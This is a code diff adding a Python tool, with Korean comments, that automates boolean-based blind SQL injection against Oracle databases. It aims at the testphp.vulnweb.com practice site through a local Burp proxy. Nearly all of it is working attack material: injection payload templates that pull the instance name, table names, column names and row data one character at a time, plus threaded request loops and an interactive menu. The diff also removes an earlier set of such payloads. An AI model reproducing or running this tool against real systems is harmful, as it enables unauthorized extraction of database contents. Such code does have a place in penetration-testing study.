@@ -1,9 +1,171 @@
-payload_templates = {
-    "database_name": "1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM (SELECT DISTINCT owner FROM all_tables WHERE ROWNUM <= {index}) WHERE ROWNUM = 1) > 0 THEN 'r4w8173' ELSE '' END) = 'r4w8173' AND SUBSTR((SELECT DISTINCT owner FROM (SELECT DISTINCT owner FROM all_tables WHERE ROWNUM <= {index}) WHERE ROWNUM = 1), {i}, 1) = '{char}' -- ",
-    "table_name": "1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM (SELECT table_name FROM all_tables WHERE owner='{db_name}' AND ROWNUM <= {index}) WHERE ROWNUM = 1) > 0 THEN 'r4w8173' ELSE '' END) = 'r4w8173' AND SUBSTR((SELECT table_name FROM (SELECT table_name FROM all_tables WHERE owner='{db_name}' AND ROWNUM <= {index}) WHERE ROWNUM = 1), {i}, 1) = '{char}' -- ",
-    "column_name": "1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM (SELECT column_name FROM all_tab_columns WHERE table_name='{table_name}' AND owner='{db_name}' AND ROWNUM <= {index}) WHERE ROWNUM = 1) > 0 THEN 'r4w8173' ELSE '' END) = 'r4w8173' AND SUBSTR((SELECT column_name FROM (SELECT column_name FROM all_tab_columns WHERE table_name='{table_name}' AND owner='{db_name}' AND ROWNUM <= {index}) WHERE ROWNUM = 1), {i}, 1) = '{char}' -- ",
-    "column_data": "1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM (SELECT {column_name} FROM {table_name} WHERE ROWNUM <= {index}) WHERE ROWNUM = 1) > 0 THEN 'r4w8173' ELSE '' END) = 'r4w8173' AND SUBSTR((SELECT {column_name} FROM (SELECT {column_name} FROM {table_name} WHERE ROWNUM <= {index}) WHERE ROWNUM = 1), {i}, 1) = '{char}' -- "
+import requests
+import pandas as pd
+from tabulate import tabulate
+import os
+import time
+from openpyxl import Workbook
+from openpyxl.styles import Font, PatternFill
+from datetime import datetime
+import urllib3
+import threading
+from queue import Queue
+
+# InsecureRequestWarning 무시 설정
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# 설정 정보
+url = "http://testphp.vulnweb.com/artists.php"  # 대상 URL
+param_name = "artist"  # 공격할 파라메터 이름
+true_response_indicator = "r4w8173"  # 참일 때 나타나는 응답 키워드
+sleep_time = 0  # 요청 간 지연 시간 (초)
+
+# Burp Suite 프록시 설정
+proxies = {
+    "http": "http://127.0.0.1:8080",
+    "https": "http://127.0.0.1:8080",
 }
+
+# SQL Injection 페이로드 템플릿 설정 (오라클 DB용)
 payload_templates = {
-    "table_name": "1' AND SUBSTR((SELECT table_name FROM (SELECT table_name FROM all_tables WHERE owner = (SELECT sys_context('userenv','current_schema') FROM dual) AND ROWNUM <= {index}) WHERE ROWNUM = {index}), {i}, 1) = '{char}' -- "
+    "database_name": "1' AND SUBSTR((SELECT sys_context('userenv','instance_name') FROM dual), {i}, 1) = '{char}' -- ",
+    "table_name": "1' AND SUBSTR((SELECT table_name FROM (SELECT table_name, ROWNUM AS rnum FROM all_tables WHERE owner = (SELECT sys_context('userenv','current_schema') FROM dual)) WHERE rnum = {index}), {i}, 1) = '{char}' -- ",
+    "column_name": "1' AND SUBSTR((SELECT column_name FROM (SELECT column_name, ROWNUM AS rnum FROM all_tab_columns WHERE table_name = '{table_name}') WHERE rnum = {index}), {i}, 1) = '{char}' -- ",
+    "column_data": "1' AND SUBSTR((SELECT {column_name} FROM (SELECT {column_name}, ROWNUM AS rnum FROM {table_name}) WHERE rnum = {index}), {i}, 1) = '{char}' -- "
 }
+
+# 참/거짓 판별 함수
+def is_true_response(response):
+    return true_response_indicator in response.text
+
+# 요청 전송 함수
+def send_request(params):
+    if request_method == "POST":
+        return requests.post(url, data=params, timeout=90, verify=False, proxies=proxies)
+    elif request_method == "GET":
+        return requests.get(url, params=params, timeout=90, verify=False, proxies=proxies)
+    else:
+        raise ValueError("잘못된 요청 방식입니다. GET 또는 POST만 가능합니다.")
+
+# 데이터베이스 이름 추출 함수
+def get_database_name():
+    db_name = ""
+    print("[정보] 데이터베이스 이름을 찾고 있습니다...")
+    threads = []
+    lock = threading.Lock()
+    queue = Queue()
+
+    def find_char():
+        nonlocal db_name
+        while not queue.empty():
+            i, char = queue.get()
+            payload = payload_templates["database_name"].format(i=i, char=char)
+            params = {param_name: payload}
+            response = send_request(params)
+            time.sleep(sleep_time)
+            if is_true_response(response):
+                with lock:
+                    db_name += char
+                    print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
+                queue.queue.clear()  # 다른 문자 없이 다시 시작
+            queue.task_done()
+
+    for i in range(1, 50):  # 최대 길이 50자 가정
+        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
+            queue.put((i, char))
+        threads.clear()
+        for _ in range(10):  # 아주 빠르게 10개 스레드 사용
+            thread = threading.Thread(target=find_char)
+            threads.append(thread)
+            thread.start()
+
+        for thread in threads:
+            thread.join()
+
+        if len(db_name) < i:
+            break
+
+    print(tabulate([[db_name]] if db_name else [], headers=["Database Name"], tablefmt="grid"))
+    print(f"총 1건" if db_name else "총 0건")
+    return db_name
+
+# 테이블 이름 추출 함수
+def get_table_names(limit="ALL"):
+    tables = []
+    print("[정보] 데이터베이스의 테이블 이름을 찾고 있습니다...")
+
+    # 최대 제한을 조정하고 테이블 이름 검색을 너무 일찍 멈추지 않도록 break 문 제거
+    max_tables = 101 if limit == "ALL" else int(limit) + 1
+    for index in range(1, max_tables):  # 최대 100개 테이블 또는 사용자 지정 개수
+        table_name = ""
+        
+        for i in range(1, 50):  # 최대 테이블 이름 길이 50자 가정
+            found_char = False
+            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
+                payload = payload_templates["table_name"].format(index=index, i=i, char=char)
+                params = {param_name: payload}
+                response = send_request(params)
+                time.sleep(sleep_time)  # 요청 후 지연
+
+                # 응답이 참인지 확인
+                if is_true_response(response):
+                    table_name += char
+                    found_char = True
+                    print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
+                    break
+            
+            # 문자 검색 루프를 종료하는 조건 설정
+            if not found_char:
+                # 첫 번째 위치에서 문자를 찾지 못했다면,
+                # 해당 인덱스에 대한 검색을 종료합니다.
+                if i == 1:
+                    # 해당 인덱스에 테이블이 없으므로 다음 인덱스로 진행
+                    break
+                else:
+                    # 테이블 이름 끝에 도달한 경우
+                    break
+        
+        if table_name:
+            tables.append(table_name)
+            print(f"[테이블 발견] {index}번째 테이블 이름: {table_name}")
+        else:
+            print(f"[정보] {index}번째 테이블 이름을 찾을 수 없습니다. 다음으로 넘어갑니다.")
+            continue  # 테이블이 없으면 다음 인덱스로 계속 진행
+
+    # 결과 출력
+    if tables:
+        print(tabulate([[t] for t in tables], headers=["Table Names"], tablefmt="grid"))
+        print(f"총 {len(tables)}건")
+    else:
+        print("총 0건")
+    return tables
+
+# 명령 선택 실행 함수
+def main():
+    global request_method
+    while True:
+        print("\n[옵션 선택]")
+        print("1. 데이터베이스 추출")
+        print("2. 테이블 추출")
+        print("3. 종료")
+        choice = input("작업을 선택하세요: ")
+
+        if choice in ["1", "2"]:
+            request_method = input("요청 방식을 선택하세요 (GET/POST): ").strip().upper()
+            if request_method not in ["GET", "POST"]:
+                print("잘못된 요청 방식입니다. GET 또는 POST 중 하나를 입력하세요.")
+                continue
+
+        if choice == "1":
+            db_name = get_database_name()
+        elif choice == "2":
+            limit = input("추출할 테이블 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
+            tables = get_table_names(limit)
+        elif choice == "3":
+            print("프로그램을 종료합니다.")
+            break
+        else:
+            print("잘못된 선택입니다. 다시 입력하세요.")
+
+# 프로그램 실행
+if __name__ == "__main__":
+    main()
